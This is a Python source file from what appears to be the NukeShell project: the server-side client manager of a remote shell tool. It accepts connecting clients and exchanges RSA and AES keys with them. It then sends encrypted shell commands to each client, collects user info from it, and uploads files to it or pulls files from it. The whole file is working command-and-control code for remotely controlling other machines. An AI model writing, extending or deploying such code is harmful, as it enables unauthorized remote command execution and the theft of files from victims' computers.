#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Author : LimerBoy
# github.com/LimerBoy/NukeShell

# Import modules
from os import path
from json import loads
from time import sleep
from colorama import Fore
from zlib import compress, decompress
from Core.encryption import RSACipher, AESCipher

aes = AESCipher()
rsa = RSACipher()
BUFFER_SIZE = 1024 * 20


# client manager
global ClientManager, ClientsManager

class Client:
    """ Connected client object """
    def __init__(self, client_socket, client_address):
        self.socket = client_socket
        self.address = client_address
        # Try exchange encryption keys
        try:
            self.ExchangeEncryptionKeys()
        except Exception as error:
            print(f"{Fore.RED}[Server]{Fore.WHITE} Failed to exchange encryption keys with client ...\n", error)
            self.socket.close()
        else:
            # Get user info
            self.GetClientInfo()
            # Add this client to list
            ClientsManager.Append(self)

    """ Send encrypted command from client """
    def Send(self, data: str) -> None:
        encoded = data.encode("utf8")
        encrypted = aes.Encrypt(encoded)
        self.socket.send(encrypted)

    """ Get encrypted data from client """
    def Read(self) -> str:
        while True:
            encrypted = self.socket.recv(BUFFER_SIZE)
            if not encrypted:
                sleep(1)
                continue
            decrypted = aes.Decrypt(encrypted)
            return decrypted.decode("utf8")

    """ Run shell command """
    def Shell(self, command: str) -> str:
        self.Send(command)
        return self.Read()

    """ Disconnect client """
    def Disconnect(self):
        print(f"{Fore.RED}[Server]{Fore.WHITE} Closing connection with:", *self.address, Fore.RESET)
        ClientsManager.Remove(self)
        self.Send("exit")
        self.socket.close()

    """ Send file to client """
    def SendFile(self, filename):
        print(f"{Fore.GREEN}[Server => Client]{Fore.WHITE} Sending file:",
              path.abspath(filename) + Fore.RESET)
        # Check if file exists
        if not path.exists(filename):
            return f"{Fore.GREEN}[Server => Client]{Fore.WHITE} File not found!{Fore.RESET}"  #self.Send("FAILED_FILE_TRANSFER")
        # Read file content
        with open(filename, "rb") as file:
            data = file.read()
            encrypted = aes.Encrypt(data)
            compressed = compress(encrypted)
            size = len(compressed)
            self.Send(f"BEGIN_FILE_TRANSFER*{size}*{filename}")  # Send command, size, filename
            sleep(0.1)
            self.socket.sendall(compressed)
        # Done
        sleep(0.1)
        self.Send("DONE_FILE_TRANSFER")
        return f"{Fore.GREEN}[Server => Client]{Fore.WHITE} File sent!{Fore.RESET}"

    """ Receive file from client """
    def ReceiveFile(self):
        command = self.Read()
        if command.startswith("BEGIN_FILE_TRANSFER"):
            splt = command.split("*")
            size = int(splt[1])
            filename = path.basename(splt[2])
            print(f"{Fore.GREEN}[Server <= Client]{Fore.WHITE} Receiving file:",
                  path.basename(filename) + Fore.RESET)
            # Receive compressed and encrypted file bytes
            content = b""
            while True:
                data = self.socket.recv(size)
                if len(data) == 96:
                    break
                # Done receiving
                if not data:
                    break
                # Append bytes
                content += data

            # Decompress, Decrypt and write bytes
            with open(filename, "wb") as file:
                print(f" {Fore.LIGHTGREEN_EX}--- {Fore.LIGHTYELLOW_EX}Loaded bytes:",
                      len(content), Fore.RESET)
                decompressed = decompress(content)
                print(f" {Fore.LIGHTGREEN_EX}--- {Fore.LIGHTYELLOW_EX}Decompressed bytes:",
                      len(decompressed), Fore.RESET)
                decrypted = aes.Decrypt(decompressed)
                print(f" {Fore.LIGHTGREEN_EX}--- {Fore.LIGHTYELLOW_EX}Decrypted bytes:",
                      len(decrypted), Fore.RESET)
                file.write(decrypted)
            # Done
            print(f"{Fore.GREEN}[Server <= Client]{Fore.WHITE} File {path.basename(filename)} saved on disk!{Fore.RESET}")
            return path.abspath(filename)
        else:
            print(f"{Fore.GREEN}[Server <= Client]{Fore.WHITE} Error:", command + Fore.RESET)

    """ Get client info """
    def GetClientInfo(self):
        self.info = loads(
            self.Shell("get_user_info"))

    """ Exchange encryption keys """
    def ExchangeEncryptionKeys(self):
        # Receive RSA public key from connected client
        self.socket.send(b"GET_CLIENT_RSA_PUBLIC_KEY")
        self.client_public_key = self.socket.recv(BUFFER_SIZE)
        # print(f"{Fore.GREEN}[Server <= Client]{Fore.WHITE} RSA public key received:\n{Fore.LIGHTWHITE_EX}"
        #      + hexlify(self.client_public_key).decode() + Fore.RESET)
        # Send RSA server public key to connected client
        if self.socket.recv(BUFFER_SIZE) == b"GET_SERVER_RSA_PUBLIC_KEY":
            self.socket.send(rsa.public_key)
        # print(f"{Fore.GREEN}[Server => Client]{Fore.WHITE} RSA public key sent to client:\n{Fore.LIGHTWHITE_EX}"
        #      + hexlify(rsa.public_key).decode() + Fore.RESET)
        # Send encrypted AES key to connected client
        if self.socket.recv(BUFFER_SIZE) == b"GET_SERVER_AES_KEY":
            encrypted_aes_key = rsa.Encrypt(self.client_public_key, aes.key)
            self.socket.send(encrypted_aes_key)
        # print(f"{Fore.GREEN}[Server => Client]{Fore.WHITE} Encrypted AES key sent to client:\n{Fore.LIGHTWHITE_EX}"
        #      + hexlify(aes.key).decode() + Fore.RESET)


class ClientManager:
    """ Connected clients object """

    def __init__(self):
        self.clients = []

    def Append(self, client: Client):
        self.clients.append(client)

    def Remove(self, client: Client):
        self.clients.remove(client)

    def GetConnectedClients(self):
        connected = []
        for client in self.clients:
            if client.socket.fileno() != -1:
                connected.append(client)
        return connected



ClientsManager = ClientManager()
